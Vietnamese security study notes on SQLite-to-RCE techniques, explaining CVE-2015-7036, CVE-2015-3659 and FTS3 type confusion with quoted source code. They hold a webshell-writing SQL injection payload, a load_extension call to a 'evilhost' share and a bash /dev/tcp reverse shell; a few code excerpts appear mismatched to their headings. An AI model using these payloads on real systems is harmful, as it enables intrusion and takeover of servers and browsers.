# SQLite Lead To RCE

## SQLite
SQLite là một engine cơ sở dữ liệu SQL nhúng, độc lập (không cần server riêng), nhẹ nhưng đầy đủ tính năng và được dùng rộng rãi.
- **Storage backend for web browsers** - SQLite được dùng làm lưu trữ cục bộ cho trình duyệt (ví dụ WebSQL/IndexedDB nội bộ).
- **Programming language binding** - Có binding cho nhiều ngôn ngữ (Python, PHP, Java, v.v.), tức là dễ tích hợp vào app viết bằng nhiều ngôn ngữ.
- **Web database** - Dùng làm DB cho ứng dụng web nhỏ hoặc test, thay vì cài đặt server DB phức tạp.
- **Embedded database for mobile apps** - Thường dùng trong iOS/Android để lưu dữ liệu app cục bộ.
- **Database on IoT devices** - Phù hợp cho thiết bị IoT do nhẹ, ít yêu cầu tài nguyên.

# Known Attacks on SQLite
## Attach Database
```php
?id=bob'; ATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn(dataz) VALUES ('<? system($_GET['cmd']); ?>');--
```

- `ATTACH DATABASE '/var/www/lol.php' AS lol;`
→ gọi lệnh SQLite ATTACH DATABASE để gắn (mount) một file làm "database" mới, và đặt `alias` là `lol`. Vì SQLite lưu DB dưới dạng file, nếu đường dẫn trỏ tới thư mục web (`/var/www/...`), thì tiếp theo có thể thao tác trên file đó (tạo table, insert) - tức là ghi dữ liệu vào file.

- `CREATE TABLE lol.pwn (dataz text);`
→ tạo một table pwn trong database lol (tức là trong file `/var/www/lol.php`). Trong SQLite, tạo table sẽ ghi cấu trúc DB vào file.

- `INSERT INTO lol.pwn(dataz) VALUES ('<? system($_GET['cmd']); ?>');`
→ chèn một dòng text chứa mã PHP vào bảng - tùy cách file được cấu trúc/ghi, nội dung này có thể xuất hiện vào file `.php` và khi truy cập qua web server sẽ được thực thi (RCE).

## SELECT load_extension()
```php
?name=123 UNION SELECT 1, load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

- `load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain')`
→ hàm SQLite cho phép nạp một extension (thư viện chia sẻ, `.dll` trên Windows hoặc `.so` trên Linux). Đưa vào đường dẫn tới thư viện độc hại (ở ví dụ là một UNC path `\\evilhost\...`) và tên hàm khởi tạo (`'DllMain'`), để hệ thống nạp mã native do attacker cung cấp. Khi nạp thành công mã native chạy trong tiến trình → có thể mở shell/nâng quyền.

## Fuzzing SQLite
```sql
create table t0(o CHar(0) CHECK(0&0>0));
insert into t0;
select randomblob(0)-trim(0);
```

- `create table t0(o CHar(0) CHECK(0&0>0));`
→ tạo bảng có cột o kiểu `CHAR(0)` (kích thước 0 - bất thường) và ràng buộc `CHECK(0&0>0)` (toán tử,biểu thức kỳ lạ). Những kiểu dữ liệu/constraint lạ này có thể khiến `parser/validator` rơi vào đường xử lý ít được thử nghiệm.

- `insert into t0;`
→ chèn một hàng không có giá trị rõ ràng (tạo row với dữ liệu rỗng/garbage), ép engine xử lý các ô trống/không chuẩn.

- `select randomblob(0)-trim(0);`
→ `randomblob(0)` trả về BLOB kích thước 0; `trim(0)` gọi trim trên giá trị không hợp lệ. Phép trừ giữa hai kết quả bất thường/không chuẩn có thể làm xảy ra mã đường dẫn lỗi (ví dụ đọc/viết ngoài vùng nhớ).

***Tóm lại:*** các biểu thức/kiểu/calls “kỳ quặc” khiến SQLite đi vào `code path` ít được test và gây **memory corruption** hoặc **crash**.

## Data Types in SQLite
Mỗi giá trị trong SQLite thuộc một trong 5 kiểu cơ bản:
- 64-bit signed integer
- 64-bit IEEE floating point number
- string
- BLOB
- NULL

SQLite dùng cơ chế dynamic typing (type affinity) - cột có tên kiểu nhưng giá trị vẫn có thể lưu dạng khác; về bản chất mọi thứ là 1 trong 5 kiểu trên.

> Kiểu BLOB/strings có thể chứa dữ liệu nhị phân hoặc payload - khi xử lý input từ nguồn không tin cậy hãy validate/limit kích thước.

## Virtual Table Mechanism
- Virtual table là đối tượng đăng ký vào một connection SQLite (không nhất thiết là file trên đĩa).
- Các truy vấn/ghi lên virtual table sẽ gọi callback (hàm do extension/implementer cung cấp).
- Dùng để: đại diện cấu trúc dữ liệu trong bộ nhớ, làm view cho dữ liệu không phải định dạng SQLite trên đĩa, hoặc tính nội dung on-demand.
> Vì virtual table chạy callback native, bugs hoặc input độc hại có thể gây crash hoặc RCE - treat extensions as untrusted code.

## Complex Features vs Simple Type System
- Nhiều extension của SQLite cần cấu trúc dữ liệu phức tạp (index FTS, R-Tree, session log…).
- Chúng tự lưu dữ liệu nội bộ vào các bảng “đặc biệt” ngay trong cùng database.
- Nhưng SQLite chỉ có 5 kiểu nền tảng ⇒ dữ liệu phức tạp thường bị nhét vào BLOB.
- Vấn đề nảy sinh:
    - Làm sao biết “kiểu gốc” của một BLOB là gì?
    - Có nên tin BLOB được lưu trong DB (do file DB có thể bị craft/giả mạo)?

## Answers from SQLite source code
- Cách SQLite/extension “đoán” kiểu gốc của BLOB:
    - Suy luận từ tên cột (column name) hoặc kiểu đối số hàm (argument type) khi đọc/giải mã.
- Có nên “tin” BLOB lưu trong DB?
    - Không nên tin mù quáng. Nếu file DB bị chỉnh tay/craft, dữ liệu BLOB có thể làm type confusion/memory corruption trong extension.

## Case Study: CVE-2015-7036
FTS3 và FTS4 là các module bảng ảo (virtual table) của SQLite cho phép người dùng thực hiện tìm kiếm toàn văn (full-text) trên một tập tài liệu. Chúng cho phép người dùng tạo các bảng đặc biệt với chỉ mục toàn văn (full-text index) tích hợp sẵn.

Một FTS tokenizer là một tập các quy tắc để trích xuất các term từ một tài liệu hoặc từ một truy vấn full-text FTS cơ bản. Ngoài việc cung cấp tokenizer “simple” và các tokenizer khác tích hợp sẵn, FTS cung cấp một giao diện để ứng dụng hiện thực và đăng ký tokenizer tùy biến viết bằng C.

FTS không phơi bày một hàm C mà người dùng có thể gọi để đăng ký các kiểu tokenizer mới với một handle database. Thay vào đó, con trỏ phải được mã hóa như một giá trị BLOB SQL và truyền cho FTS thông qua engine SQL bằng cách đánh giá một hàm scalar đặc biệt.
```sql
SELECT fts3_tokenizer(<tokenizer-name>);

SELECT fts3_tokenizer(<tokenizer-name>, <sqlite3_tokenizer_module ptr>);
```

**Ví dụ REPL**
```perl
sqlite> select hex(fts3_tokenizer('simple'));
60DDBEE2FF7F0000         -- hex của một CON TRỎ hợp lệ (tokenizer "simple")

sqlite> select fts3_tokenizer('mytokenizer', x'4141414142424242');
AAAABBBB                 -- chấp nhận BLOB do người dùng đưa vào làm con trỏ!

sqlite> select hex(fts3_tokenizer('mytokenizer'));
4141414142424242         -- con trỏ giờ = 0x4141... (“AAAA BBBB”)
```

**Rò rỉ thông tin (Info leak)**
- `fts3_tokenizer` trả về địa chỉ của `tokenizer` đã đăng ký dưới dạng BLOB, nên khi truy vấn các `tokenizer` tích hợp sẵn có thể làm rò rỉ địa chỉ cơ sở (base address) (ở định dạng big-endian) của module SQLite.

**Giải tham chiếu con trỏ không tin cậy (Untrusted pointer dereference)**
- `fts3_tokenizer` cho rằng đối số thứ hai luôn là con trỏ hợp lệ đến một `sqlite3_tokenizer_module`, và không bao giờ kiểm tra kiểu thật sự của đối số này.

## Web SQL Database
**WebDatabase** định nghĩa một API để lưu dữ liệu trong các cơ sở dữ liệu có thể truy vấn bằng biến thể của SQL. Tất cả các trình duyệt triển khai API này dùng SQLite3 làm backend.

W3C đã ngưng duy trì đặc tả WebDatabase, nhưng API vẫn có trên một số engine WebKit (Safari) và Blink (Chromium).

```js
var db = openDatabase('mydb', '1.0', 'Test DB', 2 * 1024 * 1024);
// Mở/khởi tạo DB tên 'mydb' với size hint 2MB

db.transaction(function(tx) {
  tx.executeSql('CREATE TABLE IF NOT EXISTS LOGS (id unique, log)');
  tx.executeSql('INSERT INTO LOGS (id, log) VALUES (1, "foobar")');
  tx.executeSql('INSERT INTO LOGS (id, log) VALUES (2, "logmsg")');
});
// Thực hiện một transaction: chuẩn bị bảng và insert dữ liệu

db.transaction(function(tx) {
  tx.executeSql('SELECT * FROM LOGS', [], function(tx, results) {
    var len = results.rows.length, i;
    for (i = 0; i < len; i++) {
      document.write("<p>" + results.rows.item(i).log + "</p>");
    }
  }, null);
});
// Transaction khác để SELECT và duyệt results.rows (đối tượng RowList)
```

- `openDatabase(name, version, displayName, size)` - mở DB trong trình duyệt (khi có).
- `db.transaction(fn)` - chạy một transaction; `tx.executeSql(sql, params, successCb, errorCb)` để thực thi câu SQL.
- `results.rows.item(i)` để đọc từng row trả về.

## SQLite in browser is filtered
Giao diện `sqlite3_set_authorizer()` đăng ký một callback function được gọi mỗi khi thực hiện một hành động SQL để quyết định có được phép hay không.
```cpp
void SQLiteDatabase::enableAuthorizer(bool enable)
{
    if (m_authorizer && enable)
        sqlite3_set_authorizer(m_db, SQLiteDatabase::authorizerFunction, m_authorizer.get());
}
```
Trình duyệt (như WebKit/Blink) dùng `authorizer` để chặn hoặc cho phép một số lệnh SQL trong SQLite - ví dụ không cho phép `ATTACH DATABASE`, `load_extension()`, hoặc các hàm nguy hiểm khác.

## Database Authorizer
Các hàm SQL được **whitelist**
```cpp
int DatabaseAuthorizer::allowFunction(const String& functionName)
{
    if (m_securityEnabled && !m_whitelistedFunctions.contains(functionName))
        return SQLAuthDeny;
    return SQLAuthAllow;
}
```
Chỉ những hàm có trong whitelist (`m_whitelistedFunctions`) mới được gọi.
Nếu chế độ bảo mật bật (`m_securityEnabled`), mọi hàm khác đều bị từ chối (`SQLAuthDeny`).

FTS3 là bảng ảo (virtual table) duy nhất được phép:
```cpp
int DatabaseAuthorizer::createVTable(const String& tableName, const String& moduleName)
{
    ...
    // Chỉ cho phép extension FTS3
    if (!equalLettersIgnoringASCIICase(moduleName, "fts3"))
        return SQLAuthDeny;
}
```

Trình duyệt chặn tất cả virtual table khác, chỉ để lại FTS3 (full-text search). Nếu muốn dùng `fts3_tokenizer()` (hàm dính lỗi trước đó), attacker phải bypass cơ chế authorizer này.

## CVE-2015-3659 Authorizer whitelist bypass

Ta có thể tạo một bảng mà khi đọc/sử dụng sẽ thực thi các hàm có đặc quyền, bằng cách đặt giá trị `DEFAULT` cho một cột bằng kết quả của một biểu thức SQL (ví dụ trả về con trỏ được mã hóa), rồi `INSERT` vào bảng đó.

```js
var db = openDatabase(...);
var sql = "hex(fts3_tokenizer('simple'))";
db.transaction(function(tx) {
  tx.executeSql('DROP TABLE IF EXISTS BAD;');
  tx.executeSql('CREATE TABLE BAD(id, x DEFAULT(' + sql + '));'); // <-- bypass
  tx.executeSql('INSERT INTO BAD(id) VALUES (1);');
  tx.executeSql('SELECT x FROM BAD LIMIT 1;', [], function(tx, results) {
    var val = results.rows.item(0).x;
  });
}, function(err) { log(err.message) });
```

Đoạn mã trên mở một cơ sở dữ liệu WebSQL trong trình duyệt và xây dựng một biểu thức SQL dưới dạng chuỗi: `hex(fts3_tokenizer('simple'))`. Trong một `transaction` nó tạo lại bảng `BAD` với hai cột `id` và `x`, ở đó `x` được khai báo có giá trị mặc định là chính biểu thức trên `(DEFAULT(...))`. Khi chèn một hàng mới chỉ cung cấp `id`, SQLite sẽ đánh giá biểu thức `DEFAULT` để tính giá trị của `x` và do đó thực thi `fts3_tokenizer('simple')` trong ngữ cảnh nội bộ của engine; kết quả (đã được chuyển sang hex) sẽ được lưu vào cột `x`. Sau đó mã `SELECT` đọc lại cột `x` từ hàng vừa chèn và lấy giá trị đó về JavaScript qua `results.rows.item(0).x`, tức là attacker có thể thu được kết quả trả về của hàm nội bộ. Vấn đề bảo mật nằm ở chỗ khai thác dùng biểu thức `DEFAULT` để buộc engine chạy một hàm vốn có thể bị `authorizer` chặn nếu gọi trực tiếp; bằng cách này kẻ tấn công có thể gây ra rò rỉ thông tin nội bộ hoặc - khi kết hợp với các lỗ hổng khác - dẫn tới dereference con trỏ không an toàn và hậu quả nghiêm trọng hơn.

## fts3_tokenizer code execution on browser
- SQLite3 được link tĩnh trong binary của WebKit, nên `select fts3_tokenizer('simple')` có thể rò rỉ địa chỉ base của WebKit/SQLite.
- Từ leak đó có thể tính được địa chỉ quan trọng 
- Kẻ tấn công có thể spray cấu trúc `sqlite3_tokenizer_module`, đặt callback `xCreate` trỏ tới gadget pivot trên stack, rồi gọi `select fts3_tokenizer('simple', x'...')` để làm engine dereference con trỏ và chi phối luồng điều khiển (control PC).

## fts3_tokenizer code execution in PHP

Administrator hay dùng `disable_functions` (vd. `exec`, `passthru`, `shell_exec`, `system`, `proc_open`, `popen`,...) để chặn webshells, nhưng đó không phải sandbox thực sự - nếu attacker có cách thực thi mã native trong tiến trình PHP thì mọi ràng buộc PHP có thể bị vượt qua.

Trên LAMP, `libphp` và `libsqlite3` thường được load dưới dạng shared libraries (không link tĩnh), và nếu attacker có một leak địa chỉ từ `fts3_tokenizer('simple')` họ có thể suy ra map của các thư viện này (dùng thông tin version + offset cố định).

Khi biết được base address của thư viện, attacker có thể “spray” (điền) một cấu trúc `sqlite3_tokenizer_module` giả vào vùng nhớ mà engine sẽ đọc, chỉnh trường callback (ví dụ `xCreate`) trỏ đến một gadget pivot trên stack, và rồi gọi `select fts3_tokenizer('simple', x'...')` để khiến engine dereference con trỏ đó - nếu thành công thì có khả năng chi phối luồng điều khiển và thực thi mã native trong tiến trình PHP.

Không có “stack pivot gadget” hoàn hảo ở callback xCreate, nhưng callback xOpen có thể nhận đối số từ mệnh đề `INSERT`.

```sql
$db->exec("select fts3_tokenizer('simple', x'$spray_address');
           create virtual table a using fts3;
           insert into a values('bash -c \"bash>/dev/tcp/127.1/1337 0<&1\"')");
```

Để “spray” (phủ) cấu trúc, ta có thể mở đường dẫn :memory: và chèn các giá trị BLOB đã đóng gói vào bảng trong bộ nhớ.

Một số cấu hình runtime của PHP có thể được đặt theo từng thư mục bằng .htaccess, ngay cả khi ini_set đã bị vô hiệu hóa. Một số giá trị này được đặt trong vùng nhớ liên tục của phân đoạn .bss, như [mysqlnd.net_cmd_buffer_size](https://www.php.net/manual/en/mysqlnd.config.php#ini.mysqlnd.net-cmd-buffer-size) và [mysqlnd.log_mask](https://www.php.net/manual/en/mysqlnd.config.php#ini.ini.mysqlnd.log-mask). Ta có thể dùng chúng để giả mạo cấu trúc.

Cuối cùng, dùng one-gadget trong PHP để “bật” shell.
(Đoạn mã assembly minh họa các bước di chuyển thanh ghi và gọi hàm)

```pgsql
.text:00000000002F137A  mov rbx, rsi
.text:00000000002F137D  lea rsi, aRbLr+5  ; modes
.text:00000000002F1384  sub rsp, 58h
.text:00000000002F1388  mov [rsp+88h+var_74], edi
.text:00000000002F138C  mov rdi, rbx      ; command
.text:00000000002F138F  mov [rsp+88h+var_58], rdx
.text:00000000002F1394  mov rax, 58:28h
.text:00000000002F1399  mov [rsp+88h+var_40], rax
.text:00000000002F139E  xor eax, eax
.text:00000000002F13A4  mov [rsp+88h+var_50], rcx
.text:00000000002F13A9  mov [rsp+88h+var_48], 0
.text:00000000002F13B2  call _popen
```
**Quá nhiều “hard-code”**; nếu kết hợp với các lỗi khác sẽ đáng tin cậy hơn nhiều.

**Android** đã loại bỏ/khóa tính `năng fts3_tokenizer` và từ **SQLite 3.11**, hàm `fts3_tokenizer()` - ít dùng và có rủi ro - không hoạt động trừ khi người biên dịch bật rõ tính năng đó.


## Lỗi “Type Confusion” (nhầm lẫn kiểu dữ liệu)
```csharp
static int fts3FunctionArg(
  sqlite3_context *pContext,      /* Ngữ cảnh lời gọi hàm SQL */
  const char *zFunc,              /* Tên hàm */
  sqlite3_value *pVal,            /* Đối số argv[0] được truyền vào hàm */
  Fts3Cursor **ppCsr              /* Đầu ra: lưu con trỏ cursor */
){
  Fts3Cursor *pRet;
  if( sqlite3_value_type(pVal)!=SQLITE_BLOB 
   || sqlite3_value_bytes(pVal)!=sizeof(Fts3Cursor *)
  ){
    char *zErr = sqlite3_mprintf("đối số thứ nhất không hợp lệ cho %s", zFunc);
    sqlite3_result_error(pContext, zErr, -1);
    sqlite3_free(zErr);
    return SQLITE_ERROR;
  }
  memcpy(&pRet, sqlite3_value_blob(pVal), sizeof(Fts3Cursor *));
  *ppCsr = pRet;
  return SQLITE_OK;
}
```
Đây là hàm `fts3FunctionArg()` trong mã nguồn của SQLite, được dùng trong module FTS3 để xử lý các hàm đặc biệt (như `optimize()` hoặc `offsets()`).

Hàm này lấy một đối số (`argv[0]`) truyền vào từ câu lệnh SQL.

Nếu kiểu dữ liệu không phải là `BLOB` hoặc kích thước khác với kích thước của con trỏ `Fts3Cursor*`, nó báo lỗi “illegal first argument”. Nếu hợp lệ, nó sao chép nội dung `BLOB` thành con trỏ `Fts3Cursor`, rồi gán vào ppCsr.

**Vấn đề:** Nếu người dùng cố tình truyền vào `BLOB` tùy ý (với nội dung giả mạo địa chỉ bộ nhớ), SQLite sẽ ép kiểu (cast) và truy cập vùng nhớ theo con trỏ đó → gây type confusion → có thể đọc/ghi hoặc thực thi mã tùy ý.

### Whitelist function optimize
```csharp
/ *
** Cài đặt hàm đặc biệt optimize() cho FTS3. Hàm này gộp tất cả các phân đoạn (segments) trong cơ sở dữ liệu thành một phân đoạn duy nhất.
** Ví dụ sử dụng:
** SELECT optimize(t) FROM t LIMIT 1;
** trong đó t là tên của một bảng FTS3.
*/
int sqlite3VdbeMemSetStr(Mem *pMem, const char *z, int n, u8 enc, void (*xDel)(void*) ){
  int nByte = n;
  ...
  if( nByte<0 ){
    if( enc==SQLITE_UTF8 ){
      nByte = sqlite3Strlen30(z);
      if( nByte>iLimit ) nByte = iLimit+1;
    }
    ...
  }
  if( xDel==SQLITE_TRANSIENT ){
    int nAlloc = nByte;
    ...
    if( sqlite3VdbeMemClearAndResize(pMem, MAX(nAlloc,32)) ) return SQLITE_NOMEM_BKPT;
    memcpy(pMem->z, z, nAlloc);
  }
  ...
  return SQLITE_OK;
}
```
Hàm fts3OptimizeFunc triển khai chức năng optimize. Nó lấy con trỏ cursor từ apVal[0] (qua fts3FunctionArg), rồi truy xuất con trỏ tới Fts3Table từ pCursor->base.pVtab và tiếp tục xử lý.
### FTS3 Tricks
Virtual Table có thể có phương thức xColumn tùy chỉnh để lấy giá trị của cột thứ N của hàng hiện thời.
int (*xColumn)(sqlite3_vtab_cursor*, sqlite3_context*, int N);

Module FTS3 chấp nhận tên bảng như là tên cột. Một số hàm nhận tên bảng làm đối số đầu tiên.
Ví dụ: SELECT optimize(t) FROM t LIMIT 1; (ở đây t vừa là tên bảng vừa là tham chiếu cột)

Tuy nhiên, khi tên bảng không được cung cấp đúng cột, câu lệnh vẫn có thể được biên dịch.

Bộ thông dịch không bao giờ biết kiểu dữ liệu cần thiết của dữ liệu cột.

### Type Confusion (ví dụ thực nghiệm)
Ví dụ thực tế: tạo một virtual table bằng FTS3, chèn một BLOB có giá trị cụ thể, lấy hex của cột và sau đó gọi optimize(b) gây ra segmentation fault - minh chứng cho bug nhầm kiểu (type confusion) dẫn tới crash.
```
SQLite version 3.14.0 2016-07-26 15:17:14
...
sqlite> create virtual table a using fts3(b);
sqlite> insert into a values(x'4141414142424242');
sqlite> select hex(a) from a;
C854D98F08560000
sqlite> select optimize(b) from a;
[1]    37515 segmentation fault  sqlite3
```


```
# invokeProfileCallback
##### static SQLITE_NOINLINE void invokeProfileCallback(sqlite3 *db, Vdbe *p){
   sqlite3_int64 iNow;
   sqlite3_int64 iElapse;
   ...
   sqlite3OsCurrentTimeInt64(db->pVfs, &iNow);
   iElapse = (iNow - p->startTime)*1000000;
   if( db->xProfile ){
     db->xProfile(db->pProfileArg, p->zSql, iElapse);
   }
   if( db->mTrace & SQLITE_TRACE_PROFILE ){
     db->xTrace(SQLITE_TRACE_PROFILE, db->pTraceArg, p, (void*)&iElapse);
   }
   p->startTime = 0;
}
##### We used callback db->xProfile because we can also control 2 arguments through db->pProfileArg and p->zSql
```

Đoạn code fts3OptimizeFunc lặp lại, chú ý tới pCursor → p = (Fts3Table *)pCursor->base.pVtab;

Lấy hàm optimize() làm ví dụ:
- Với lỗi type confusion, ta có thể cung cấp giá trị tùy ý cho pCursor.
- Nếu ta có thể kiểm soát vùng nhớ tại một địa chỉ biết trước, ta có thể dựng giả cấu trúc Fts3Cursor và các struct liên quan (như Fts3Table).
- `sqlite3Fts3Optimize` sẽ xử lý thể giả đó như thể nó là thể thật; ta cần tìm đường đi trong code (optimize/offsets/matchinfo) để có primitive đọc/ghi tùy ý (arbitrary RW) hoặc điều khiển PC.

## Exploitation Strategy
- Để có khả năng kiểm soát bộ nhớ tại địa chỉ biết trước, heap spray vẫn hữu dụng trong trình duyệt hiện đại - ví dụ phân bổ nhiều ArrayBuffer trong JavaScript.
- Dereference Fts3Cursor tại địa chỉ đã được kiểm soát, nơi ta có thể giả lập Fts3Cursor và các struct khác.
- Tìm một đường đi mã (code path) trong optimize / offsets / matchinfo() để có primitive arbitrary RW hoặc kiểm soát PC.

> Lược đồ khai thác: spray heap → dựng fake structs → điều hướng code để leo từ fake struct tới arbitrary read/write hoặc execution.

## One Exploitation Path for Arbitrary RW
Đồ thị chuỗi gọi hàm - tóm tắt các hàm đi qua để đạt primitive
```
fts3OptimizeFunc → sqlite3Fts3Optimize → sqlite3Fts3SegmentsClose → sqlite3_blob_close → sqlite3_finalize → sqlite3VdbeFinalize → sqlite3VdbeReset → sqlite3ValueSetStr → sqlite3VdbeMemSetStr
```

Một chuỗi gọi hàm cho phép biến thao tác thành một hành vi tương tự strcpy với tham số do attacker kiểm soát, qua đó đạt được:
- Copy từ vị trí kiểm soát tới bất kỳ địa chỉ nào → arbitrary write
- Copy từ bất kỳ địa chỉ nào về vị trí kiểm soát → arbitrary read


```c
static void fts3OptimizeFunc(
    sqlite3_context *pContext,
    int nVal,
    sqlite3_value **apVal
){
    int rc;
    Fts3Table *p;
    Fts3Cursor *pCursor;

    UNUSED_PARAMETER(nVal);
    assert( nVal==1 );
    if( fts3FunctionArg(pContext, "optimize", apVal[0], &pCursor) )
        return;

    p = (Fts3Table *)pCursor->base.pVtab;

    rc = sqlite3Fts3Optimize(p);
    ...
}
```

Hacker giả lập (fake) một struct Fts3Cursor và các struct liên quan trong vùng nhớ có thể điều khiển được (heap sprayed).

Thêm một Fts3Table vào trong Fts3Cursor.

Khi hàm fts3OptimizeFunc chạy, nó lấy `p = (Fts3Table *)pCursor->base.pVtab;`, nghĩa là nếu `pCursor` bị giả mạo, ta có thể điều khiển con trỏ p, dẫn tới thực thi tùy ý khi gọi `sqlite3Fts3Optimize(p).`

```
Fts3Cursor
 ├─ sqlite3_vtab_cursor base
 ├─ pVtab  →  (trỏ đến Fts3Table)
 ├─ ...
 └─ ...
```

Mục tiêu là điều khiển pCursor sao cho `pCursor->base.pVtab` trỏ tới vùng nhớ tùy ý (fake Fts3Table), từ đó khai thác hàm sqlite3Fts3Optimize(p) để đạt RCE.

### sqlite3Fts3Optimize

```c
int sqlite3Fts3Optimize(Fts3Table *p){
    int rc;

    rc = sqlite3_exec(p->db, "SAVEPOINT fts3", 0, 0, 0);
    if( rc==SQLITE_OK ){
        rc = fts3DoOptimize(p, 1);
        if( rc==SQLITE_OK || rc==SQLITE_DONE ){
            int rc2 = sqlite3_exec(p->db, "RELEASE fts3", 0, 0, 0);
            if( rc2!=SQLITE_OK ) rc = rc2;
        }else{
            sqlite3_exec(p->db, "ROLLBACK TO fts3", 0, 0, 0);
            sqlite3_exec(p->db, "RELEASE fts3", 0, 0, 0);
        }
    }

    sqlite3Fts3SegmentsClose(p);
    return rc;
}
```
- Hàm khởi tạo một `SAVEPOINT` rồi gọi `fts3DoOptimize(p, 1)`.
- Nếu optimize thành công (SQLITE_OK hoặc SQLITE_DONE) thì `RELEASE fts3;` nếu `RELEASE` lỗi thì trả mã lỗi đó. Nếu `fts3DoOptimize` thất bại thì ROLLBACK TO fts3 rồi `RELEASE fts3`.
- Cuối cùng luôn gọi `sqlite3Fts3SegmentsClose(p)` rồi trả `rc`.

```c
int sqlite3_exec(
    sqlite3 *db,
    const char *zSql,
    sqlite3_callback xCallback,
    void *pArg,
    char **pzErrMsg
){
    int rc = SQLITE_OK;
    const char *zLeftover;
    sqlite3_stmt *pStmt = 0;
    char **azCols = 0;
    int callbackIsInit;

    /* safety check */
    if( ! sqlite3SafetyCheckOk(db) ) 
        return SQLITE_MISUSE_BKPT;

    if( zSql==0 ) zSql = "";
    ...
    return rc;
}
```

```c
int sqlite3SafetyCheckOk(sqlite3 *db){
    u32 magic;
    if( db==0 ){
        logBadConnection("NULL");
        return 0;
    }
    magic = db->magic;
    if( magic!=SQLITE_MAGIC_OPEN ){
        if( sqlite3SafetyCheckSickOrOk(db) ){
            testcase( sqlite3GlobalConfig.xLog!=0 );
            logBadConnection("unopened");
        }
        return 0;
    }else{
        return 1;
    }
}
```

- `sqlite3_exec` gọi `sqlite3SafetyCheckOk(db)` và nếu trả về 0 thì `sqlite3_exec` sẽ trả `SQLITE_MISUSE_BKPT` (không tiếp tục thao tác).
- s`qlite3SafetyCheckOk` trả 0 khi `db == NULL` hoặc `db->magic` khác `SQLITE_MAGIC_OPEN`.
- Nếu attacker có thể làm cho db = 0 (hoặc fake struct khiến magic không hợp lệ) thì `sqlite3_exec` sẽ sớm trả lỗi - điều này có ý nghĩa khi phân tích luồng lỗi / exploit chain

```c
void sqlite3Fts3SegmentsClose(Fts3Table *p){
    sqlite3_blob_close(p->pSegments);
    p->pSegments = 0;
}

int sqlite3_blob_close(sqlite3_blob *pBlob){
    Incrblob *p = (Incrblob *)pBlob;
    int rc;
    sqlite3 *db;

    if( p ){
        db = p->db;
        sqlite3_mutex_enter(db->mutex);
        rc = sqlite3_finalize(p->pStmt);
        sqlite3DbFree(db, p);
        sqlite3_mutex_leave(db->mutex);
    }else{
        rc = SQLITE_OK;
    }
    return rc;
}
```

```c
int sqlite3_finalize(sqlite3_stmt *pStmt){
    int rc;
    if( pStmt==0 ){
        rc = SQLITE_OK;
    }else{
        Vdbe *v = (Vdbe*)pStmt;
        sqlite3 *db = v->db;

        if( vdbeSafety(v) ) return SQLITE_MISUSE_BKPT;
        sqlite3_mutex_enter(db->mutex);
        checkProfileCallback(db, v);
        rc = sqlite3VdbeFinalize(v);
        /* rc = sqlite3ApiExit(db, rc); */
        sqlite3LeaveMutexAndCloseZombie(db);
    }
    return rc;
}

int sqlite3VdbeFinalize(Vdbe *p){
    int rc = SQLITE_OK;
    if( p->magic==VDBE_MAGIC_RUN || p->magic==VDBE_MAGIC_HALT ){
        rc = sqlite3VdbeReset(p);
        assert( (rc & p->db->errMask) == rc );
    }
    sqlite3VdbeDelete(p);
    return rc;
}
```

- Fts3Table bây giờ chứa con trỏ `pSegments` trỏ tới một Incrblob.
- `sqlite3Fts3SegmentsClose` gọi `sqlite3_blob_close` trên `pSegments` rồi set về 0.
- `sqlite3_blob_close` sẽ lấy `db = p->db`, vào mutex của db, gọi `sqlite3_finalize(p->pStmt)` (tức sẽ dọn Vdbe liên quan), giải phóng `p` rồi `leave mutex`.
- `sqlite3_finalize` kiểm tra an toàn `vdbeSafety()` / đăng ký c`allback profiling`, vào `mutex`, gọi `sqlite3VdbeFinalize`, rồi gọi hàm dọn `mutex`/`zombie`.
- `sqlite3VdbeFinalize` nếu `p->magic` ở trạng thái chạy/halt thì gọi `sqlite3VdbeReset` trước, rồi xóa `Vdbe`.

```c
int sqlite3VdbeReset(Vdbe *p){
    sqlite3 *db;
    db = p->db;

    /* đảm bảo p ở trạng thái halt trước (sqlite3VdbeHalt đã gọi) */
    sqlite3VdbeHalt(p);

    /* nếu p->pc >= 0 thì xử lý lỗi / log / giải phóng chuỗi lỗi */
    if( p->pc >= 0 ){
        vdbeInvokeSqllog(p);
        sqlite3VdbeTransferError(p);
        sqlite3DbFree(db, p->zErrMsg);
        p->zErrMsg = 0;

        if( p->runOnlyOnce ) p->expired = 1;
        else if( p->rc && p->expired ){
            /* ... xử lý khác ... */
        }
    }

    Cleanup(p);               /* dọn dẹp internal resources của Vdbe */
    p->iCurrentTime = 0;
    p->magic = VDBE_MAGIC_RESET;

    return p->rc & db->errMask;
}
```

- `sqlite3VdbeHalt(p)` đảm bảo VDBE đã dừng chạy an toàn trước khi reset.
- Khi `p->pc >= 0` (tức VDBE từng chạy/đang chạy), hàm sẽ:
    - Ghi log nếu cần (vdbeInvokeSqllog),
    - Di chuyển/đồng bộ trạng thái lỗi (sqlite3VdbeTransferError),
    - Giải phóng bất kỳ chuỗi lỗi (p->zErrMsg) rồi set 0,

Đánh dấu expired nếu runOnlyOnce.

Cuối cùng dọn dẹp Cleanup(p), reset thời gian, đặt magic về VDBE_MAGIC_RESET và trả p->rc & db->errMask.